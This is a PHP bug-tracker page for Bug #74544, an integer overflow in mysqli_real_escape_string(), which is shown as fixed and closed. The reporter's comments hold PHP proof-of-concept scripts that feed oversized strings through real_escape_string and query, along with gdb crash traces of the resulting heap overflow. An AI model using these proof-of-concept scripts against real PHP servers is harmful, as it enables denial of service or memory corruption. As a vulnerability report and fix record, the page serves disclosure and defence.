<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='MySQLi related Bug #74544 - RDF' href='rss/bug.php?id=74544'>
        <link rel='alternate' type='application/rss+xml' title='MySQLi related Bug #74544 - RSS 2.0' href='rss/bug.php?id=74544&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #74544 :: Integer overflow in mysqli_real_escape_string()</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=74544">Bug</a>&nbsp;#74544</th>
            <td id="summary" colspan="5">Integer overflow in mysqli_real_escape_string()</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2017-05-05 04:31 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2021-08-09 10:49 UTC</td>
            <td rowspan="6">

                <table id="votes">
                    <tr><th class="details">Votes:</th><td>3</td></tr>
                    <tr><th class="details">Avg. Score:</th><td>3.7 &plusmn; 1.9</td></tr>
                    <tr><th class="details">Reproduced:</th><td>1 of 2 (50.0%)</td></tr>
                    <tr><th class="details">Same Version:</th><td>1 (100.0%)</td></tr>
                    <tr><th class="details">Same OS:</th><td>1 (100.0%)</td></tr>
                </table>

            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=cmb">cmb</a> (<a href="https://people.php.net/cmb">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=MySQLi+related">MySQLi related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.1.5</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><em>None</em></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=74544&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=74544&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=74544&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1493958679">&nbsp;</a><strong>[2017-05-05 04:31 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
PHP_FUNCTION(mysqli_real_escape_string) {
	MY_MYSQL	*mysql;
	zval		*mysql_link = NULL;
	char		*escapestr;
	size_t			escapestr_len;
	zend_string *newstr;

	if (zend_parse_method_parameters(ZEND_NUM_ARGS(), getThis(), &quot;Os&quot;, &amp;mysql_link, mysqli_link_class_entry, &amp;escapestr, &amp;escapestr_len) == FAILURE) {
		return;
	}
	MYSQLI_FETCH_RESOURCE_CONN(mysql, mysql_link, MYSQLI_STATUS_VALID);

	newstr = zend_string_alloc(2 * escapestr_len, 0);  //integer overflow
	ZSTR_LEN(newstr) = mysql_real_escape_string(mysql-&gt;mysql, ZSTR_VAL(newstr), escapestr, escapestr_len);
	newstr = zend_string_truncate(newstr, ZSTR_LEN(newstr), 0);

	RETURN_NEW_STR(newstr);
}

Test script:
---------------
&lt;?php
ini_set(&quot;memory_limit&quot;,-1);
$str=str_repeat(&quot;A&quot;,0x7fffffff);
$str.=&quot;AAAAA&quot;;
$mysqli=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;toor&quot;,&quot;mysql&quot;);
$mysqli-&gt;real_escape_string($str);
?&gt;


Actual result:
--------------
root@hackyzh-virtual-machine:~# gdb -q --args ./php-7.1.4/sapi/cli/php -n poc2.php
Reading symbols from /root/php-7.1.4/sapi/cli/php...done.
(gdb) b mysqli_api.c:1968
Breakpoint 1 at 0x81ddbdc: file /root/php-7.1.4/ext/mysqli/mysqli_api.c, line 1968.
(gdb) r
Starting program: /root/php-7.1.4/sapi/cli/php -n poc2.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

Breakpoint 1, zif_mysqli_real_escape_string (execute_data=0xb70130f0, 
    return_value=0xbfffc100) at /root/php-7.1.4/ext/mysqli/mysqli_api.c:1968
1968		newstr = zend_string_alloc(2 * escapestr_len, 0);
(gdb) p/x escapestr_len
$1 = 0x80000004
(gdb) p/x 2*escapestr_len
$2 = 0x8


</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=74544&amp;patch=bug74544.diff&amp;revision=latest" >bug74544.diff</a>
(last revision 2017-07-24 10:11 UTC by johannes &#x61;&#116; schlueters &#x64;&#111;&#x74; de)
<br><p><a href='patch-add.php?bug_id=74544'>Add a Patch</a></p><h2>Pull Requests</h2>
<div>
Pull requests:<br>
<ul>
  <li><a href="https://github.com/php/php-src/pull/7353">Fix #74544: Integer overflow in mysqli_real_escape_string()</a>
      (php-src/7353)</li>
</ul>
</div>
<p><a href='gh-pull-add.php?bug_id=74544'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1494317858">&nbsp;</a><strong>[2017-05-09 08:17 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>In php-7.0.1,I take this script ot test.Then,it crash.In others,it does not.I do not know why the same code will have different results.
_____________________________________________________________________

&lt;?php
ini_set(&quot;memory_limit&quot;,-1);
$str=str_repeat(&quot;A&quot;,0x7ffffff0);
$mysqli=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;toor&quot;,&quot;mysql&quot;);
$mysqli-&gt;real_escape_string($str);
?&gt;
_____________________________________________________________________

hackyzh@ubuntu:~/Downloads$ gdb -q --args ./php-7.0.1/sapi/cli/php -n ../Desktop/poc.php
Reading symbols from /home/hackyzh/Downloads/php-7.0.1/sapi/cli/php...done.
(gdb) r
Starting program: /home/hackyzh/Downloads/php-7.0.1/sapi/cli/php -n ../Desktop/poc.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

Warning: String is not zero-terminated (@��) (source: /home/hackyzh/Downloads/php-7.0.1/Zend/zend_vm_execute.h:858) in /home/hackyzh/Desktop/poc.php on line 6
[Tue May  9 16:11:53 2017]  Script:  '/home/hackyzh/Desktop/poc.php'

Program received signal SIGSEGV, Segmentation fault.
0x08474ed6 in format_converter (odp=0xbfffc974, 
    fmt=0x8b365a5 &quot;s(%d) : Actual location (location was relayed)\n&quot;, 
    ap=0xbfffc9e0 &quot;&quot;) at /home/hackyzh/Downloads/php-7.0.1/main/snprintf.c:993
993							s_len = strlen(s);
(gdb) bt
#0  0x08474ed6 in format_converter (odp=0xbfffc974, 
    fmt=0x8b365a5 &quot;s(%d) : Actual location (location was relayed)\n&quot;, 
    ap=0xbfffc9e0 &quot;&quot;) at /home/hackyzh/Downloads/php-7.0.1/main/snprintf.c:993
#1  0x08475719 in strx_printv (ccp=0xbfffc9b8, 
    buf=0xbfffda4c &quot;Tue May  9 16:11:53 2017&quot;, len=512, 
    format=0x8b365a4 &quot;%s(%d) : Actual location (location was relayed)\n&quot;, 
    ap=0xbfffc9dc &quot;\377\377\377\377&quot;)
    at /home/hackyzh/Downloads/php-7.0.1/main/snprintf.c:1248
#2  0x08475817 in ap_php_snprintf (buf=0xbfffda4c &quot;Tue May  9 16:11:53 2017&quot;, 
    len=512, 
    format=0x8b365a4 &quot;%s(%d) : Actual location (location was relayed)\n&quot;)
    at /home/hackyzh/Downloads/php-7.0.1/main/snprintf.c:1293
#3  0x08471625 in php_message_handler_for_zend (message=4, data=0xbfffdcbc)
    at /home/hackyzh/Downloads/php-7.0.1/main/main.c:1435
#4  0x084eca9e in zend_message_dispatcher (message=4, data=0xbfffdcbc)
    at /home/hackyzh/Downloads/php-7.0.1/Zend/zend.c:999
#5  0x084c1af9 in zend_mm_check_leaks (heap=0xb7000040)
    at /home/hackyzh/Downloads/php-7.0.1/Zend/zend_alloc.c:2121
#6  0x084c1d99 in zend_mm_shutdown (heap=0xb7000040, full=0, silent=0)
    at /home/hackyzh/Downloads/php-7.0.1/Zend/zend_alloc.c:2193
#7  0x084c2acf in shutdown_memory_manager (silent=0, full_shutdown=0)
    at /home/hackyzh/Downloads/php-7.0.1/Zend/zend_alloc.c:2629
#8  0x0847204d in php_request_shutdown (dummy=0x0)
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
    at /home/hackyzh/Downloads/php-7.0.1/main/main.c:1833
#9  0x08598c13 in do_cli (argc=3, argv=0x8c1cd30)
    at /home/hackyzh/Downloads/php-7.0.1/sapi/cli/php_cli.c:1142
#10 0x0859942a in main (argc=3, argv=0x8c1cd30)
    at /home/hackyzh/Downloads/php-7.0.1/sapi/cli/php_cli.c:1345
</pre>
</div><div class='comment type_comment' ><a name="1494494261">&nbsp;</a><strong>[2017-05-11 09:17 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>I found a way to make it crash.It seems to be able to execute remote code.
&lt;?php
ini_set(&quot;memory_limit&quot;,-1);
$str=str_repeat(&quot;A&quot;,0x7fffffff);
$str.=&quot;AA&quot;;
$mysqli=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;toor&quot;,&quot;mysql&quot;);
$v=$mysqli-&gt;real_escape_string($str); 
$mysqli-&gt;query($v);           
?&gt;
_______________________________________________________
Program received signal SIGSEGV, Segmentation fault.
0xb7a63976 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) bt
#0  0xb7a63976 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x08349eaf in php_mysqlnd_cmd_write (_packet=0xb7068038)
    at /usr/include/i386-linux-gnu/bits/string3.h:52
#2  0x08349a4b in mysqlnd_mysqlnd_protocol_send_command_pub (
    payload_decoder_factory=0xb706f000, command=COM_QUERY, arg=0xb7002080 &quot;\220 &quot;, 
    arg_len=4294967295, silent=0 '\000', connection_state=0xb706663c, 
    error_info=0xb7066424, upsert_status=0xb70663fc, stats=0xb7002050, 
    send_close=0x83422a0 &lt;mysqlnd_mysqlnd_conn_data_send_close_pub&gt;, 
    send_close_ctx=0xb7066380)
    at /root/php-7.1.4/ext/mysqlnd/mysqlnd_wireprotocol.c:2772
#3  0x08358e6c in mysqlnd_com_query_run (cmd=0xb70543d8)
    at /root/php-7.1.4/ext/mysqlnd/mysqlnd_commands.c:644
#4  0x08342040 in mysqlnd_mysqlnd_conn_data_send_query_pub (conn=0xb7066380, 
    query=0xb7002080 &quot;\220 &quot;, query_len=4294967295, type=MYSQLND_SEND_QUERY_IMPLICIT, 
    read_cb=0x0, err_cb=0x0) at /root/php-7.1.4/ext/mysqlnd/mysqlnd_connection.c:889
#5  0x08344a04 in mysqlnd_mysqlnd_conn_data_query_pub (query_len=4294967295, 
    query=0xb7002080 &quot;\220 &quot;, conn=0xb7066380)
    at /root/php-7.1.4/ext/mysqlnd/mysqlnd_connection.c:858
#6  mysqlnd_mysqlnd_conn_data_query_pub (conn=0xb7066380, query=0xb7002080 &quot;\220 &quot;, 
    query_len=4294967295) at /root/php-7.1.4/ext/mysqlnd/mysqlnd_connection.c:850
#7  0x081e391a in zif_mysqli_query (execute_data=0xb7013120, return_value=0xbfffc100)
    at /root/php-7.1.4/ext/mysqli/mysqli_nonapi.c:593
#8  0x084558e3 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER (execute_data=0xb7013020)
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
    at /root/php-7.1.4/Zend/zend_vm_execute.h:970
#9  0x084093be in execute_ex (ex=0xb7013020)
    at /root/php-7.1.4/Zend/zend_vm_execute.h:432
#10 0x0845770f in zend_execute (op_array=0xb7069180, return_value=0x0)
    at /root/php-7.1.4/Zend/zend_vm_execute.h:474
#11 0x083c15c0 in zend_execute_scripts (type=8, retval=0x0, file_count=3)
    at /root/php-7.1.4/Zend/zend.c:1476
#12 0x08362a0d in php_execute_script (primary_file=0xbfffe464)
    at /root/php-7.1.4/main/main.c:2537
#13 0x08459824 in do_cli (argc=3, argv=0x8a8d868)
    at /root/php-7.1.4/sapi/cli/php_cli.c:993
#14 0x080785ad in main (argc=3, argv=0x8a8d868)
    at /root/php-7.1.4/sapi/cli/php_cli.c:1381
</pre>
</div><div class='comment type_log' ><a name="1494554891">&nbsp;</a><strong>[2017-05-12 02:08 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.1.4</span>
<span class="added">+PHP Version: 7.1.5</span>
</div></div></div><div class='comment type_comment' ><a name="1494554893">&nbsp;</a><strong>[2017-05-12 02:08 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>In new php version,it also has the same bug.
</pre>
</div><div class='comment type_comment' ><a name="1494841454">&nbsp;</a><strong>[2017-05-15 09:44 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Has anyone solved it?
</pre>
</div><div class='comment type_comment' ><a name="1495008845">&nbsp;</a><strong>[2017-05-17 08:14 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>gdb-peda$ r
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0xb719409b --&gt; 0x0 
EBX: 0xb7ab0000 --&gt; 0x1abda8 
ECX: 0xffe6df64 
EDX: 0xb71fffa0 --&gt; 0x0 
ESI: 0xb7002050 --&gt; 0xb7061600 --&gt; 0x5e ('^')
EDI: 0xb70600f0 --&gt; 0xb706e000 --&gt; 0x2000000 
EBP: 0x57f7 
ESP: 0xbfffbef8 --&gt; 0xffffffff 
EIP: 0xb7a3a666 (&lt;__memcpy_ssse3_rep+3510&gt;:	movntdq XMMWORD PTR [edx+0x60],xmm6)
EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7a3a657 &lt;__memcpy_ssse3_rep+3495&gt;:	movntdq XMMWORD PTR [edx+0x30],xmm3
   0xb7a3a65c &lt;__memcpy_ssse3_rep+3500&gt;:	movntdq XMMWORD PTR [edx+0x40],xmm4
   0xb7a3a661 &lt;__memcpy_ssse3_rep+3505&gt;:	movntdq XMMWORD PTR [edx+0x50],xmm5
=&gt; 0xb7a3a666 &lt;__memcpy_ssse3_rep+3510&gt;:	movntdq XMMWORD PTR [edx+0x60],xmm6
   0xb7a3a66b &lt;__memcpy_ssse3_rep+3515&gt;:	movntdq XMMWORD PTR [edx+0x70],xmm7
   0xb7a3a670 &lt;__memcpy_ssse3_rep+3520&gt;:	lea    edx,[edx+0x80]
   0xb7a3a676 &lt;__memcpy_ssse3_rep+3526&gt;:	
    jae    0xb7a3a605 &lt;__memcpy_ssse3_rep+3413&gt;
   0xb7a3a678 &lt;__memcpy_ssse3_rep+3528&gt;:	add    ecx,0x80
[------------------------------------stack-------------------------------------]
0000| 0xbfffbef8 --&gt; 0xffffffff 
0004| 0xbfffbefc --&gt; 0x834a14f (&lt;php_mysqlnd_cmd_write+543&gt;:	mov    edx,DWORD PTR [esp+0x2c])
0008| 0xbfffbf00 --&gt; 0xb706e005 --&gt; 0xb7002090 --&gt; 0xb70020a0 --&gt; 0xb70020b0 --&gt; 0xb70020c0 (--&gt; ...)
0012| 0xbfffbf04 --&gt; 0xb7002080 --&gt; 0xb7002090 --&gt; 0xb70020a0 --&gt; 0xb70020b0 --&gt; 0xb70020c0 (--&gt; ...)
0016| 0xbfffbf08 --&gt; 0xffffffff 
0020| 0xbfffbf0c --&gt; 0x8348267 (&lt;_mysqlnd_pecalloc+151&gt;:	jmp    0x8348211 &lt;_mysqlnd_pecalloc+65&gt;)
0024| 0xbfffbf10 --&gt; 0x4 
0028| 0xbfffbf14 --&gt; 0xb7054478 (&quot;toor&quot;)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
__memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:1300
1300	../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S: No such file or directory.
gdb-peda$ bt
#0  __memcpy_ssse3_rep () at ../sysdeps/i386/i686/multiarch/memcpy-ssse3-rep.S:1300
#1  0x0834a14f in php_mysqlnd_cmd_write (_packet=0xb7068038)
    at /usr/include/i386-linux-gnu/bits/string3.h:52
#2  0x08349ceb in mysqlnd_mysqlnd_protocol_send_command_pub (
    payload_decoder_factory=0xb706f000, command=COM_QUERY, arg=0xb7002080 &quot;\220 &quot;, 
    arg_len=0xffffffff, silent=0x0, connection_state=0xb706663c, 
    error_info=0xb7066424, upsert_status=0xb70663fc, stats=0xb7002050, 
    send_close=0x8342540 &lt;mysqlnd_mysqlnd_conn_data_send_close_pub&gt;, 
    send_close_ctx=0xb7066380)
    at /root/php-7.1.5/ext/mysqlnd/mysqlnd_wireprotocol.c:2772
#3  0x0835910c in mysqlnd_com_query_run (cmd=0xb70544b0)
    at /root/php-7.1.5/ext/mysqlnd/mysqlnd_commands.c:644
#4  0x083422e0 in mysqlnd_mysqlnd_conn_data_send_query_pub (conn=0xb7066380, 
    query=0xb7002080 &quot;\220 &quot;, query_len=0xffffffff, type=MYSQLND_SEND_QUERY_IMPLICIT, 
    read_cb=0x0, err_cb=0x0) at /root/php-7.1.5/ext/mysqlnd/mysqlnd_connection.c:889
#5  0x08344ca4 in mysqlnd_mysqlnd_conn_data_query_pub (query_len=0xffffffff, 
    query=0xb7002080 &quot;\220 &quot;, conn=0xb7066380)
    at /root/php-7.1.5/ext/mysqlnd/mysqlnd_connection.c:858
#6  mysqlnd_mysqlnd_conn_data_query_pub (conn=0xb7066380, query=0xb7002080 &quot;\220 &quot;, 
    query_len=0xffffffff) at /root/php-7.1.5/ext/mysqlnd/mysqlnd_connection.c:850
#7  0x081e3b1a in zif_mysqli_query (execute_data=0xb7013120, return_value=0xbfffc100)
    at /root/php-7.1.5/ext/mysqli/mysqli_nonapi.c:593
#8  0x08455c93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER (execute_data=0xb7013020)
    at /root/php-7.1.5/Zend/zend_vm_execute.h:970
#9  0x0840969e in execute_ex (ex=0xb7013020)
    at /root/php-7.1.5/Zend/zend_vm_execute.h:432
#10 0x08457abf in zend_execute (op_array=0xb7069180, return_value=0x0)
    at /root/php-7.1.5/Zend/zend_vm_execute.h:474
#11 0x083c1890 in zend_execute_scripts (type=0x8, retval=0x0, file_count=0x3)
    at /root/php-7.1.5/Zend/zend.c:1476
#12 0x08362cad in php_execute_script (primary_file=0xbfffe464)
    at /root/php-7.1.5/main/main.c:2537
#13 0x08459bd4 in do_cli (argc=0x3, argv=0x8a8e868)
    at /root/php-7.1.5/sapi/cli/php_cli.c:993
#14 0x080785ad in main (argc=0x3, argv=0x8a8e868)
    at /root/php-7.1.5/sapi/cli/php_cli.c:1381
#15 0xb791daf3 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
#16 0x08078641 in _start ()
——————————————————————————————————————————————————————
It seems to lead to buffer overflow.
</pre>
</div><div class='comment type_log' ><a name="1497939695">&nbsp;</a><strong>[2017-06-20 06:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_log' ><a name="1628506182">&nbsp;</a><strong>[2021-08-09 10:49 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Verified</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: cmb</span>
</div></div></div><div class='comment type_patch' ><a name="1628506205">&nbsp;</a><strong>[2021-08-09 10:50 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>The following pull request has been associated:

Patch Name: Fix #74544: Integer overflow in mysqli_real_escape_string()
On GitHub:  <a href="https://github.com/php/php-src/pull/7353" rel="nofollow">https://github.com/php/php-src/pull/7353</a>
Patch:      <a href="https://github.com/php/php-src/pull/7353.patch" rel="nofollow">https://github.com/php/php-src/pull/7353.patch</a>
</pre>
</div><div class='comment type_svn' ><a name="1628546947">&nbsp;</a><strong>[2021-08-09 22:09 UTC] <a href="//people.php.net/git">git@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of cmb69
Revision: <a href="https://github.com/php/php-src/commit/5977610de1aa87630e40a299a2d90fb7cd00bf7c" rel="nofollow">https://github.com/php/php-src/commit/5977610de1aa87630e40a299a2d90fb7cd00bf7c</a>
Log: Fix #74544: Integer overflow in mysqli_real_escape_string()
</pre>
</div><div class='comment type_log' ><a name="1628546947">&nbsp;</a><strong>[2021-08-09 22:09 UTC] <a href="//people.php.net/git">git@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Verified</span>
<span class="added">+Status: Closed</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
